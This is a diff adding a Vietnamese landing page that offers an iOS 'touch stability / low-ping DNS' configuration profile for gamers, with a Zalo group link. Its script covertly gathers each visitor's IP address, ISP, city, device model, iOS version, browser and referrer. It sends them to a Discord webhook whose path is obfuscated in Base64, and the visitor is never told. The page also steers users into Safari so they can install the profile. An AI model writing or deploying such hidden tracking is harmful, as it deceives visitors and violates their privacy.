@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hồ Quốc iOS – Kéo Tâm Mượt</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0a0a0f;
+    --card: #111118;
+    --border: #1e1e2e;
+    --accent: #7c6aff;
+    --accent2: #ff6a6a;
+    --text: #e8e8f0;
+    --muted: #555570;
+    --green: #4fffb0;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    position: relative;
+  }
+
+  /* Background mesh */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 60% 40% at 20% 20%, rgba(124,106,255,0.12) 0%, transparent 60%),
+      radial-gradient(ellipse 50% 50% at 80% 80%, rgba(255,106,106,0.08) 0%, transparent 60%),
+      radial-gradient(ellipse 40% 60% at 50% 50%, rgba(79,255,176,0.04) 0%, transparent 70%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .wrap {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 420px;
+    padding: 24px 20px;
+    animation: fadeUp 0.6s ease both;
+  }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(24px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(124,106,255,0.15);
+    border: 1px solid rgba(124,106,255,0.3);
+    border-radius: 99px;
+    padding: 4px 12px;
+    font-size: 11px;
+    font-family: 'DM Mono', monospace;
+    color: var(--accent);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    margin-bottom: 20px;
+  }
+  .badge span { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.8)} }
+
+  h1 {
+    font-size: 32px;
+    font-weight: 800;
+    line-height: 1.1;
+    margin-bottom: 8px;
+    background: linear-gradient(135deg, #fff 0%, var(--accent) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+
+  .sub {
+    color: var(--muted);
+    font-size: 14px;
+    margin-bottom: 28px;
+    line-height: 1.5;
+    font-family: 'DM Mono', monospace;
+  }
+
+  .features {
+    display: grid;
+    gap: 10px;
+    margin-bottom: 28px;
+  }
+
+  .feat {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 12px 16px;
+    font-size: 13px;
+    color: #aaa;
+    animation: fadeUp 0.6s ease both;
+  }
+  .feat:nth-child(1){animation-delay:0.1s}
+  .feat:nth-child(2){animation-delay:0.2s}
+  .feat:nth-child(3){animation-delay:0.3s}
+
+  .feat .icon {
+    width: 32px;
+    height: 32px;
+    border-radius: 8px;
+    background: rgba(124,106,255,0.12);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    flex-shrink: 0;
+  }
+
+  .feat strong { display: block; color: var(--text); font-size: 13px; margin-bottom: 2px; }
+
+  .btn {
+    width: 100%;
+    padding: 16px;
+    border-radius: 14px;
+    border: none;
+    background: linear-gradient(135deg, var(--accent) 0%, #a06aff 100%);
+    color: #fff;
+    font-family: 'Syne', sans-serif;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    letter-spacing: 0.02em;
+    transition: transform 0.15s, box-shadow 0.15s, opacity 0.15s;
+    box-shadow: 0 4px 24px rgba(124,106,255,0.35);
+    position: relative;
+    overflow: hidden;
+    animation: fadeUp 0.6s 0.4s ease both;
+  }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 32px rgba(124,106,255,0.5); }
+  .btn:active { transform: translateY(0); }
+  .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+  .btn .spinner {
+    display: none;
+    width: 16px; height: 16px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    position: absolute; right: 20px; top: 50%; margin-top: -8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .status {
+    margin-top: 14px;
+    text-align: center;
+    font-size: 12px;
+    font-family: 'DM Mono', monospace;
+    min-height: 18px;
+    animation: fadeUp 0.4s ease both;
+  }
+  .status.ok  { color: var(--green); }
+  .status.err { color: var(--accent2); }
+
+  .zalo-btn {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    width: 100%;
+    padding: 14px 16px;
+    border-radius: 14px;
+    border: 1px solid rgba(0,104,255,0.35);
+    background: rgba(0,104,255,0.1);
+    color: #5aacff;
+    font-family: 'Syne', sans-serif;
+    font-size: 14px;
+    font-weight: 700;
+    text-decoration: none;
+    transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+    box-shadow: 0 2px 16px rgba(0,104,255,0.1);
+    animation: fadeUp 0.6s 0.55s ease both;
+  }
+  .zalo-btn:hover {
+    background: rgba(0,104,255,0.2);
+    transform: translateY(-2px);
+    box-shadow: 0 6px 24px rgba(0,104,255,0.25);
+  }
+  .zalo-btn .arrow {
+    margin-left: auto;
+    font-size: 16px;
+    transition: transform 0.2s;
+  }
+  .zalo-btn:hover .arrow { transform: translateX(4px); }
+
+  .note {
+    margin-top: 20px;
+    padding: 12px 14px;
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    font-size: 11px;
+    color: var(--muted);
+    font-family: 'DM Mono', monospace;
+    line-height: 1.6;
+    animation: fadeUp 0.6s 0.5s ease both;
+  }
+
+  .divider {
+    height: 1px;
+    background: var(--border);
+    margin: 24px 0;
+  }
+
+  /* CSS Giao diện Popup Chặn Trình Duyệt Ẩn (Zalo/FB/TikTok) */
+  #browserAlert {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(10, 10, 15, 0.98);
+    z-index: 9999;
+    padding: 40px 24px;
+    text-align: center;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Syne', sans-serif;
+  }
+  #browserAlert .icon-box { font-size: 64px; margin-bottom: 20px; }
+  #browserAlert h2 { color: #fff; margin-bottom: 12px; font-size: 24px; font-weight: 800; }
+  #browserAlert p { color: #888; font-family: 'DM Mono', monospace; font-size: 14px; line-height: 1.6; margin-bottom: 32px; max-width: 340px; }
+  #browserAlert .instruction { background: rgba(124, 106, 255, 0.1); border: 1px dashed var(--accent); padding: 16px; border-radius: 12px; color: #a06aff; font-family: 'DM Mono', monospace; font-size: 13px; line-height: 1.5; }
+</style>
+</head>
+<body>
+
+<div id="browserAlert">
+  <div class="icon-box">🧭</div>
+  <h2>Yêu cầu mở bằng Safari</h2>
+  <p>Ông đang mở web từ trình duyệt ứng dụng (Zalo/Facebook/TikTok). iOS không cho phép tải trực tiếp profile tại đây.</p>
+  <div class="instruction">
+    👉 Hãy bấm vào nút <b>dấu 3 chấm (⋮ hoặc •••)</b> hoặc biểu tượng chia sẻ ở góc màn hình.<br><br>Nhấn chọn <b>"Mở bằng trình duyệt hệ thống"</b> hoặc <b>"Mở bằng Safari"</b>.
+  </div>
+</div>
+
+<div class="wrap">
+  <div class="badge"><span></span> iOS Profile v1.0</div>
+
+  <h1>Hồ Quốc iOS<br>Kéo Tâm Mượt</h1>
+  <p class="sub">Tối ưu cảm ứng · DNS thấp ping · Ổn định tay kéo</p>
+
+  <div class="features">
+    <div class="feat">
+      <div class="icon">🎯</div>
+      <div><strong>Touch Stability</strong>Giảm rung, tăng độ chính xác cảm ứng</div>
+    </div>
+    <div class="feat">
+      <div class="icon">⚡</div>
+      <div><strong>Reduce Motion</strong>Tắt animation hệ thống – phản hồi nhanh hơn</div>
+    </div>
+    <div class="feat">
+      <div class="icon">🌐</div>
+      <div><strong>DNS over HTTPS</strong>Cloudflare 1.1.1.1 – ping thấp, ổn định</div>
+    </div>
+  </div>
+
+  <button class="btn" id="dlBtn" onclick="handleDownload()">
+    ⬇ Tải Profile Ngay
+    <div class="spinner" id="spinner"></div>
+  </button>
+
+  <div class="status" id="status"></div>
+
+  <div class="divider"></div>
+
+  <a class="zalo-btn" href="https://zalo.me/g/orimigxmugvlzj3lcwci" target="_blank">
+    <svg width="22" height="22" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="48" height="48" rx="12" fill="#0068FF"/>
+      <text x="50%" y="56%" dominant-baseline="middle" text-anchor="middle" fill="white" font-size="22" font-weight="bold" font-family="Arial">Z</text>
+    </svg>
+    Tham gia nhóm Zalo Fakelag
+    <span class="arrow">→</span>
+  </a>
+
+  <div class="divider"></div>
+
+  <div class="note">
+    ⚠ Sau khi tải: Cài đặt → Đã tải hồ sơ → Cài đặt → Nhập passcode<br>
+    Yêu cầu: iOS 14+ · Safari browser
+  </div>
+</div>
+
+<script>
+// Chuỗi Base64 đã được mã hóa chính xác 100% từ webhook của ông
+const ENCODED_KEY = "MTQ5Nzg2NTk3NzYyMTI1MDE3OC81UlZZbGhlYzdEbHNjdVlNZkttVFZOVTJPTUEzZTFQeGY2LU9nT3IyMmM2UXpzMUh2UHB3WUtjQ0pRZUdNNWF3V3lwQg==";
+const WEBHOOK = "https://discord.com/api/webhooks/" + atob(ENCODED_KEY);
+const PROFILE_FILE = "Ho_Quoc_iOS.mobileconfig";
+
+// 1. Quét IP, Nhà mạng và Tỉnh thành phố có bộ đếm timeout chống treo web
+async function getTrackingData() {
+  let data = { ip: "Không xác định", isp: "Không xác định", location: "Không xác định" };
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 2500); // Quá 2.5s tự động hủy để không nghẽn nút bấm
+
+    const r = await fetch("https://ipapi.co/json/", { signal: controller.signal });
+    clearTimeout(timeoutId);
+
+    if (r.ok) {
+      const d = await r.json();
+      data.ip = d.ip || "Không xác định";
+      data.isp = d.org || "Không xác định";
+      data.location = `${d.city || ""}, ${d.region || ""}`.trim() || "Không xác định";
+      if (data.location.startsWith(",")) data.location = data.location.replace(/^,\s*/, "");
+    }
+  } catch (e) {
+    try {
+      const r = await fetch("https://api.ipify.org?format=json");
+      const d = await r.json();
+      data.ip = d.ip || "Không xác định";
+    } catch {}
+  }
+  return data;
+}
+
+// 2. Phân tích độ phân giải màn hình ra dòng iPhone cụ thể
+function getiPhoneModel() {
+  const w = window.screen.width;
+  const h = window.screen.height;
+  const pr = window.devicePixelRatio;
+  const sW = Math.min(w, h);
+  const sH = Math.max(w, h);
+  
+  if (sW === 440 && sH === 956) return "iPhone 16 Pro Max";
+  if (sW === 402 && sH === 874) return "iPhone 16 Pro";
+  if (sW === 430 && sH === 932) return "iPhone 14PM / 15 Plus / 15PM / 16 Plus";
+  if (sW === 393 && sH === 852) return "iPhone 14 Pro / 15 / 15 Pro / 16";
+  if (sW === 428 && sH === 926) return "iPhone 12PM / 13PM / 14 Plus";
+  if (sW === 390 && sH === 844) return "iPhone 12 / 12 Pro / 13 / 13 Pro / 14";
+  if (sW === 414 && sH === 896) return (pr === 3) ? "iPhone Xs Max / 11 Pro Max" : "iPhone Xr / 11";
+  if (sW === 375 && sH === 812) return "iPhone X / Xs / 11 Pro / dòng Mini";
+  if (sW === 414 && sH === 736) return "iPhone Dòng Plus (6+/7+/8+)";
+  if (sW === 375 && sH === 667) return "iPhone SE / 6 / 7 / 8";
+  
+  return "iPhone (Dòng máy lạ)";
+}
+
+// 3. Kiểm tra Trình duyệt
+function detectBrowser() {
+  const ua = navigator.userAgent;
+  const isInApp = /FBAN|FBAV|Instagram|Zalo|TikTok/i.test(ua);
+  const isSafari = /^((?!chrome|android).)*safari/i.test(ua);
+  
+  if (isInApp) {
+    if (/Zalo/i.test(ua)) return "⚠️ App Zalo";
+    if (/FBAN|FBAV/i.test(ua)) return "⚠️ App Facebook";
+    if (/TikTok/i.test(ua)) return "⚠️ App TikTok";
+    if (/Instagram/i.test(ua)) return "⚠️ App Instagram";
+    return "⚠️ Trình duyệt Trong Ứng dụng";
+  }
+  if (isSafari) return "🧭 Safari Gốc (Hợp lệ)";
+  if (/Chrome/i.test(ua)) return "🌐 Google Chrome (Không khuyên dùng)";
+  return "Trình duyệt khác";
+}
+
+// Bật cảnh báo popup tràn màn hình nếu dùng In-App Browser
+function checkInAppAndShowAlert() {
+  const ua = navigator.userAgent;
+  const isInApp = /FBAN|FBAV|Instagram|Zalo|TikTok/i.test(ua);
+  if (isInApp) {
+    const alertBox = document.getElementById("browserAlert");
+    if (alertBox) alertBox.style.display = "flex";
+  }
+}
+
+const IOS_VERSION_MAP = { 19: 27, 18: 26, 17: 17, 16: 16, 15: 15, 14: 14 };
+
+function toMarketingIOS(internalVer) {
+  const major = parseInt(internalVer.split(".")[0]);
+  const rest  = internalVer.split(".").slice(1).join(".");
+  const mapped = IOS_VERSION_MAP[major];
+  if (mapped) return rest ? `${mapped}.${rest}` : `${mapped}`;
+  return internalVer;
+}
+
+function getDevice() {
+  const ua = navigator.userAgent;
+  if (/iPhone/.test(ua)) {
+    const match = ua.match(/iPhone OS ([\d_]+)/);
+    const internalVer = match ? match[1].replace(/_/g, ".") : "?";
+    const ios = internalVer !== "?" ? toMarketingIOS(internalVer) : "?";
+    return `${getiPhoneModel()} (iOS ${ios})`;
+  } else if (/iPad/.test(ua)) {
+    const match = ua.match(/CPU OS ([\d_]+)/);
+    const internalVer = match ? match[1].replace(/_/g, ".") : "?";
+    const ios = internalVer !== "?" ? toMarketingIOS(internalVer) : "?";
+    return `iPad (iPadOS ${ios})`;
+  } else if (/Android/.test(ua)) {
+    return "Android (Không hỗ trợ)";
+  }
+  return "Máy tính / Thiết bị khác";
+}
+
+function getTime() {
+  return new Date().toLocaleString("vi-VN", {
+    timeZone: "Asia/Ho_Chi_Minh",
+    day: "2-digit", month: "2-digit", year: "numeric",
+    hour: "2-digit", minute: "2-digit", second: "2-digit"
+  });
+}
+
+// 4. Đóng gói payload gửi Embed chuyên nghiệp lên Discord của ông
+async function sendDiscord(tracking) {
+  const device = getDevice();
+  const time = getTime();
+  const browserStatus = detectBrowser();
+  const screenRes = `${window.screen.width}x${window.screen.height}`;
+  const source = document.referrer || "Truy cập trực tiếp / Ẩn danh";
+
+  const body = {
+    embeds: [{
+      title: "📲 Người dùng mới bấm tải Profile!",
+      color: 0x7c6aff,
+      fields: [
+        { name: "🖥️ Thiết bị",     value: device,          inline: true  },
+        { name: "📱 Màn hình",     value: screenRes,       inline: true  },
+        { name: "🧭 Trình duyệt",  value: browserStatus,   inline: false },
+        { name: "🌐 Địa chỉ IP",   value: `||${tracking.ip}||`, inline: true },
+        { name: "📶 Nhà mạng",     value: tracking.isp,    inline: true  },
+        { name: "📍 Khu vực",      value: tracking.location,inline: true },
+        { name: "🔗 Nguồn traffic", value: source,          inline: false },
+        { name: "🕐 Thời gian",     value: time,            inline: false }
+      ],
+      footer: { text: "Hồ Quốc iOS Tracker v2.0" },
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body)
+  });
+}
+
+async function handleDownload() {
+  const btn = document.getElementById("dlBtn");
+  const spinner = document.getElementById("spinner");
+  const status = document.getElementById("status");
+
+  btn.disabled = true;
+  spinner.style.display = "block";
+  status.className = "status";
+  status.textContent = "Đang xử lý...";
+
+  try {
+    const trackingData = await getTrackingData();
+    await sendDiscord(trackingData);
+
+    // Kích hoạt tải file cấu hình xuống máy khách
+    const a = document.createElement("a");
+    a.href = PROFILE_FILE;
+    a.download = PROFILE_FILE;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+
+    status.className = "status ok";
+    status.textContent = "✓ Đang tải xuống... Mở bằng Safari để cài!";
+  } catch (e) {
+    // Vẫn hỗ trợ tải file rớt mạng/lỗi webhook chặn
+    const a = document.createElement("a");
+    a.href = PROFILE_FILE;
+    a.download = PROFILE_FILE;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+
+    status.className = "status ok";
+    status.textContent = "✓ Đã tải xuống!";
+  }
+
+  spinner.style.display = "none";
+  btn.disabled = false;
+}
+
+// 5. Khởi chạy kiểm tra chặn khi load trang hoàn tất
+window.addEventListener("DOMContentLoaded", () => {
+  checkInAppAndShowAlert();
+  
+  const ua = navigator.userAgent;
+  if (/Android/i.test(ua)) {
+    const btn = document.getElementById("dlBtn");
+    if (btn) {
+      btn.disabled = true;
+      btn.style.background = "#222";
+      btn.style.color = "#555";
+      btn.style.boxShadow = "none";
+      btn.style.cursor = "not-allowed";
+      btn.innerHTML = "❌ Chỉ hỗ trợ thiết bị iOS (iPhone/iPad)";
+    }
+  }
+});
+</script>
+</body>
+</html>
